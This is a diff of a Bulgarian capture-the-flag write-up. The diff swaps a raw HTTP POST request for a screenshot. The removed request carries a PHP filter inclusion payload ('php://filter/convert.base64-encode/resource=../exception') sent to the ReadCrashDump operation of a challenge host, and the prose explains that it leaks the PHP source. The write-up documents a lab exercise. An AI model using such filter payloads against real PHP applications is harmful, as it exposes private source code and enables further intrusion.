@@ -338,22 +338,8 @@ Debug лога разкрива поредния mp3 файл скрит на we
 
 Това ни позволява да използваме PHP filters за в `crashdump` ключа на съобщението и така успешно да изпълним **PHP Remote File Inclusion** в  `ReadCrashDump` функцията. Резултата ни позволява да вземем [source coda](files/exception.php) на **exception.php**, енкодиран в отново в **base64**.
 
-```
-http://ex.northpolewonderland.com/exception.php
-POST /exception.php HTTP/1.1
-Host: ex.northpolewonderland.com
-Content-type: application/json
-Connection: close
-Content-Length: 123
+![](images/exploit_rfi.png)
 
-{
-	"operation": "ReadCrashDump",
-	"data" : 
-    {
-        "crashdump": "php://filter/convert.base64-encode/resource=../exception"
-    }
-}
-```
 В сорс кога намираме пътя към mp3 файл, нужен ни за да приключим и с тази част от задачите.
 
 ![](images/exception_ex_source.png)
